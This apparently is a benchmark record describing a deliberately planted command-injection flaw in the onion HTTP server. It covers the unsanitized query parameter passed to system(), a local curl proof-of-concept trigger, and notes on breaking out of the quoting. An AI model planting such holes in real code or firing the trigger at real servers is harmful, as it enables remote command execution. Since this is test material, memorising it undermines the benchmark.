SOURCE:      /home/ubuntu/anthropic/corpus/onion/server.c
AXES:        C2 I2 S1

DESCRIPTION:
  Config-file-gated command injection in onion HTTP server. Server started with
  --exec-config PATH; config file sets exec_mode=1 and exec_logging=1. User-
  supplied cmd is wrapped in sh -c '...' via snprintf then passed to system().
  No sanitization.

CONFIG_GATE (C2 — config file):
  mechanism:  key=value config parsed by read_exec_config() via fopen/fgets/sscanf
              into struct exec_config { int enabled; int logging; char secret[64]; }
  check:      `exec_cfg.enabled && exec_cfg.logging` in exec_handler()
  new CLI:    --exec-config PATH (replaces --exec-mode)

INPUT_FLOW (I2 — buffered):
  entry:      HTTP GET /exec?cmd=<payload>
  path:       exec_handler() gets cmd via onion_request_get_query(),
              snprintf(shell_cmd, sizeof, "sh -c '%s' 2>/dev/null", cmd),
              system(shell_cmd)
  transforms: one snprintf wrapping in sh -c '...'

SANITIZATION (S1 — none):
  none

SINK:        system() in exec_handler() (server.c)

CHANGED FILES:
  server.c — 3 hunks:
    1. globals:     exec_cfg struct and read_exec_config() added
    2. handler:     gate changed to exec_cfg.enabled && exec_cfg.logging;
                    I2 snprintf + system() added
    3. main():      --exec-config PATH replaces --exec-mode

EXPLOIT:
  config:  echo -e "exec_mode = 1\nexec_logging = 1" > /tmp/poc_181.conf
  start:   ./onion_server --port 18181 --exec-config /tmp/poc_181.conf
  trigger: curl 'http://127.0.0.1:18181/exec?cmd=id>/tmp/poc_181_marker'
  verify:  cat /tmp/poc_181_marker

  gate bypass: start without --exec-config; exec_cfg stays zeroed; /exec returns 404

NOTES:
  - I2 wraps in sh -c '...'; single quotes in cmd would break out, but basic
    payloads (id>/path) work fine.
  - system() output captured by 2>/dev/null in shell_cmd; use file write to verify.
